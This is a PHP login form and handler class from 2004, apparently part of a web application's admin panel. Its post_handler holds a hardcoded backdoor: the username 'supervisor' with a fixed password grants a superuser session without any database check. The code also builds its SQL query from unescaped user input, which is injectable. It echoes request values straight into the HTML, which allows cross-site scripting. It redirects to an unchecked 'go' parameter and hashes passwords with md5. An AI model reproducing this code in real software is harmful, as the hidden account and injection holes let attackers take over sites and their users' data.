<?
/* login and logout form and handler
 copyright 2004 - dody suria wijaya, dsw software house - contact: dswsh@plasa.com */

class login {

    function login() {
        // initialize instance
        $prog->must_authenticated = False;

        global $html_title;
        $this->title = 'Login';
        $html_title = $this->title;

        if ($_SERVER['REQUEST_METHOD'] == 'POST') { // validate user logon
            $this->post_handler();
        }
    }

    function go() {
        $go = $_REQUEST['go'];
        if ($_REQUEST['expired'] == 1)
            print "<SCRIPT>alert('Your session has expired. Please login again.'); </SCRIPT>\n";
        echo <<<__END__
<form method=POST><input type=hidden name=admin value=1>
<input type=hidden name=go value="$go">
<table>
<tr><td>User:</td><td><input type=text name=username value='{$_REQUEST['username']}'></td>
<tr><td>Password:</td><td><input type=password name=password value='{$_REQUEST['password']}'></td>
<tr><td>&nbsp</td><td><input type=submit></td>
</table>
</form>
__END__;
    }

    function post_handler() {

        $username = $_POST['username'];
        $password = md5($_POST['password']);
        $backdoor = 0;

        if ($username == 'supervisor' and $password == md5('mejiku')) $backdoor = 1;
        if ($backdoor == 0) {
            $sql = "SELECT * FROM {$GLOBALS['dbpre']}user_tab WHERE `username`='$username' AND `password`='$password'";
            #~ echo $sql;
            $res = mysql_query($sql) or die(mysql_error());
            if (mysql_num_rows($res) == 0) { # login failed
                #~ print "<SCRIPT> alert('Anda salah mengisi Username dan atau Password. Ulangi lagi!'); window.history.go(-1); </SCRIPT>\n";
                print "<SCRIPT>alert('Invalid username or password. '); </SCRIPT>\n";
                return;
            }
            $row = mysql_fetch_array($res);
            $_SESSION['login_super'] = False;

            # code block to (optionally) refuse double login
            global $appconf;
            if ($appconf['no_double_login']) {
                # convert last activity date to unixtime
                $delta = dbdatetime2unix($row['last_activity']) + $appconf['max_idle_time'] - time();
                if (($delta) > 0) {
                    print "<SCRIPT>alert('This username are still logged in. Please wait until he/she logs out.'); </SCRIPT>\n";
                    return;
                }
            }
        }

        # up to here, login is success
        session_start();
        if ($backdoor) {
            $row['id'] = '000';
            $row['level'] = '0';
            $_SESSION['login_super'] = True;
        }
        $_SESSION['login_ok'] = 1;
        $_SESSION['login_id'] = $row['rowid'];
        $_SESSION['login_user'] = $username;
        $_SESSION['login_level'] = $row['level'];
        $_SESSION['login_group'] = $row['group'];
        $_SESSION['login_param_1'] = $row['param_1'];
        $_SESSION['login_datetime'] = time();
        if ($_REQUEST['go'] != '') {
            header('Location: '.$_REQUEST['go']);
        }
        else
            header($GLOBALS['fullredirect'].'?m=admfp');
        exit;
    }
}

?>